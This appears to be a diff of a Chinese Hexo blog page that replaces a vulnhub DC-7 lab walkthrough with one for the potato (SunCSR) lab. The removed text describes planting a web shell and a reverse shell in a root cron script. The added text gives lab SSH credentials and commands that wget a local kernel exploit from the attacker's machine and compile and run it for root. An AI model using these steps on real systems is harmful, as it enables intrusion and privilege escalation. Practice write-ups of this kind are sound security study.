@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="vulnhub-DC7, C,Pyhton,Linux">
+    <meta name="keywords" content="vulnhub-potato(SunCSR), C,Pyhton,Linux">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>vulnhub-DC7 | lemon-fan</title>
+    <title>vulnhub-potato(SunCSR) | lemon-fan</title>
     <link rel="icon" type="image/png" href="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/14.png">
 
     <link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/libs/awesome/css/all.css">
@@ -306,12 +306,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/11.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">vulnhub-DC7</h1>
+                    <h1 class="description center-align post-title">vulnhub-potato(SunCSR)</h1>
                 </div>
             </div>
         </div>
@@ -434,25 +434,12 @@
             <div class="row tag-cate">
                 <div class="col s7">
                     
-                    <div class="article-tag">
-                        
-                            <a href="/tags/web%E5%9F%BA%E7%A1%80/">
-                                <span class="chip bg-color">web基础</span>
-                            </a>
-                        
-                    </div>
+                          <div class="article-tag">
+                            <span class="chip bg-color">无标签</span>
+                          </div>
                     
                 </div>
                 <div class="col s5 right-align">
-                    
-                    <div class="post-cate">
-                        <i class="fas fa-bookmark fa-fw icon-category"></i>
-                        
-                            <a href="/categories/web%E6%B8%97%E9%80%8F/" class="post-category">
-                                web渗透
-                            </a>
-                        
-                    </div>
                     
                 </div>
             </div>
@@ -461,28 +448,28 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2020-11-14
+                    2020-11-21
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2020-11-14
+                    2020-11-21
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    713
+                    415
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-clock fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                    2 分
+                    1 分
                 </div>
                 
 
@@ -498,14 +485,15 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h1><p>在配置好vulnhub-DC7之后我们在他的虚拟机界面能够直接看到他的IP地址，然后根据我们之前的套路，直接用IP地址访问，可你看到80界面。同时也顺便扫一下靶机的端口，可以看到，开启了22端口，说明我们会拿到某些用户的账号和密码。</p>
-<p><a href="https://imgchr.com/i/DPMnIS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMnIS.png" alt></a><br>我根据网上看到wp，发现关键在于@DC7USER，也就是我们在靶机80页面的页脚，百度搜一手，发现是个github用户。<br><a href="https://imgchr.com/i/DPMQ2j" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMQ2j.png" alt></a><br><a href="https://imgchr.com/i/DPMtaT" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMtaT.png" alt></a></p>
-<h1 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h1><p>用户的公共仓库中有网站的部分源码，下载后在config.php中发现了用户名和密码，利用ssh连接一手。<br><a href="https://imgchr.com/i/DPMNIU" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMNIU.png" alt></a><br><a href="https://imgchr.com/i/DPMaiF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMaiF.png" alt></a><br>cat一下该用户目录下的两个文件，发现有一个打不开，另外一个是一个邮件，而且，我们在这个邮件的前半部分发现了一个路径，<br><a href="https://imgchr.com/i/DPMwRJ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMwRJ.png" alt></a><br>cd一手发现没有什么提示，<br><a href="https://imgchr.com/i/DPMxQs" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPMxQs.png" alt></a><br>再查看一下该文件的权限，发现一个奇怪的东西，这个文件root具有最高权限，但是它所属的是www-data组，也就是说这可能会是我们的一个提权的点。</p>
-<p>那么接下来就需要我们想办法去将自己变为www-data，然而到这里我是真的感觉抓瞎，在看了别人的wp之后发现drush是drupal站点专门用来管理自己网站的shell，也就是说我们可以在网站的根目录下修改网站用户的密码，然后cd到网站根目录下操作<br><a href="https://imgchr.com/i/DPQCwV" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQCwV.png" alt></a><br>我们在修改过admin的密码之后从靶机的80页面登录，然后进入后台。<br><a href="https://imgchr.com/i/DPQeyR" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQeyR.png" alt></a><br>这时候我感觉又抓瞎了，然后就双快乐一下别人的wp，发现这个网站本身是不支持PHP语言的，但是drupal有支持PHP的插件，所以我们可以到下面的地址中下载压缩包<br><a href="https://www.drupal.org/project/php" target="_blank" rel="noopener">https://www.drupal.org/project/php</a></p>
-<p>在下载完成之后去靶机80页面的后台进行如下操作<br><a href="https://imgchr.com/i/DPQtOI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQtOI.png" alt></a><br><a href="https://imgchr.com/i/DPQa0P" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQa0P.png" alt></a><br><a href="https://imgchr.com/i/DPQBtS" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQBtS.png" alt></a><br><a href="https://imgchr.com/i/DPQDfg" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQDfg.png" alt></a><br><a href="https://imgchr.com/i/DPQspQ" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQspQ.png" alt></a><br>然后install</p>
-<h1 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h1><p>然后我们就可以使用PHP语言类，然后进入网站后台，编辑一下主页面，加入一句话木马<br><a href="https://imgchr.com/i/DPQvtO" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPQvtO.png" alt></a><br>蚁剑连接，反弹shell，实现交互式shell</p>
-<p><a href="https://imgchr.com/i/DPllBq" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPllBq.png" alt></a><br><a href="https://imgchr.com/i/DPltCF" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPltCF.png" alt></a></p>
-<p>刚才我们发现了/opt/scripts/backups.sh这个文件是一个提权的点，所以我叒看了别人的wp，发现这确实是一个提权的点，原理是，这是原本是一个备份文件，而root用户每隔一段时间就会指向这个文件里边的命令，所以我们一www-data用户向这个文件中写入反弹shell的命令，kali中监听端口，而我们只要等待root用户下一次执行这个文件就可以拿到root用户的权限了。<br><a href="https://imgchr.com/i/DPlhDI" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPlhDI.png" alt></a><br><a href="https://imgchr.com/i/DPl4bt" target="_blank" rel="noopener"><img src="https://s3.ax1x.com/2020/11/14/DPl4bt.png" alt></a></p>
+                <h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>扫描一波，找到靶机的IP，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/1.png" alt><br>直接IP打开80端口页面，发现除了一张土豆照片之外什么也没有，所以觉得可能会有其他端口开启了但没有被扫描到，所以，利用nmap再扫描一次，看到了开起了7120端口，而且利用了TCP协议，我在看了别人的wp之后了解到靶机将ssh服务转接到了7120端口。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/2.png" alt></p>
+<h2 id="前渗透阶段"><a href="#前渗透阶段" class="headerlink" title="前渗透阶段"></a>前渗透阶段</h2><p>所以我尝试连接一下发现了确实是一个ssh端口，但是我没有登录的账号密码，所以只能利用被人的wp，得到账号为potato，密码为letmein（主要是我的九头蛇出问题了，还有就是没有字典），登录上之后，我们相当于一个游客的权限。<br><img src="/2020/11/21/vulnhub-potato-SunCSR/3.png" alt></p>
+<h2 id="后渗透阶段"><a href="#后渗透阶段" class="headerlink" title="后渗透阶段"></a>后渗透阶段</h2><p>在登陆上之候，sudo一下发现并没有文件我们是可以以root权限执行的，所以就只能从系统漏洞着手了，发现这是一个版本为3.13.0的Ubuntu。（很老的版本了）<br><img src="/2020/11/21/vulnhub-potato-SunCSR/7.png" alt><br>在kali中寻找一下该系统的exp，将37292.c保存到/var/www/html目录下，<br><img src="/2020/11/21/vulnhub-potato-SunCSR/4.png" alt><br>然后开启web服务。</p>
+<pre class=" language-shell"><code class="language-shell">python -m SimpleHTTPServer  //kali开启web服务
+wget http://192.168.10.207:8000/wdnmd.c  //靶机下载exp</code></pre>
+<p><img src="/2020/11/21/vulnhub-potato-SunCSR/5.png" alt><br>靶机从kali上下载exp，将39272利用gcc命令转变一下文件格式，从c文件转换为文件，（我背这一步卡了好长时间，最后看了c文件中给的提示才知道怎么操作）然后执行，拿到了root权限，拿到了flag。</p>
+<pre class=" language-shell"><code class="language-shell">gcc wdnmd.c -o wdnmd    /文件格式转换
+./wdnmd            /执行文件，提权</code></pre>
+<p><img src="/2020/11/21/vulnhub-potato-SunCSR/6.png" alt></p>
 
             </div>
             <hr/>
@@ -531,7 +519,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://lemon-fan.github.io/2020/11/14/vulnhub-DC7/">http://lemon-fan.github.io/2020/11/14/vulnhub-DC7/</a>
+                    <a href="http://lemon-fan.github.io/2020/11/21/vulnhub-potato-SunCSR/">http://lemon-fan.github.io/2020/11/21/vulnhub-potato-SunCSR/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -568,11 +556,7 @@
                 <div class="post-meta__tag-list" style="display: inline-block;">
                     
                         <div class="article-tag">
-                            
-                                <a href="/tags/web%E5%9F%BA%E7%A1%80/">
-                                    <span class="chip bg-color">web基础</span>
-                                </a>
-                            
+                            <span class="chip bg-color">无标签</span>
                         </div>
                     
                 </div>
@@ -633,9 +617,48 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
+            <div class="card">
+                <a href="/2020/11/21/vulnhub-potato-SunCSR/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/11.jpg" class="responsive-img" alt="vulnhub-potato(SunCSR)">
+                        
+                        <span class="card-title">vulnhub-potato(SunCSR)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            信息收集扫描一波，找到靶机的IP，直接IP打开80端口页面，发现除了一张土豆照片之外什么也没有，所以觉得可能会有其他端口开启了但没有被扫描到，所以，利用nmap再扫描一次，看到了开起了7120端口，而且利用了TCP协议，我在看了别人的wp之
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-21
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            lemon-fan
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
             <div class="card">
                 <a href="/2020/11/17/vulnhub-DC8/">
                     <div class="card-image">
@@ -654,9 +677,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2020-11-17
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-17
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -676,43 +699,6 @@
                         <span class="chip bg-color">web基础</span>
                     </a>
                     
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2020/11/14/hello-world/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="https://cdn.jsdelivr.net/gh/lemon-fan/lemon-fan.github.io/medias/featureimages/12.jpg" class="responsive-img" alt="Hello World">
-                        
-                        <span class="card-title">Hello World</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hex
-                        
-                    </div>
-                    <div class="publish-info">
-                            <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2020-11-14
-                            </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            lemon-fan
-                            
-                        </span>
-                    </div>
                 </div>
                 
             </div>
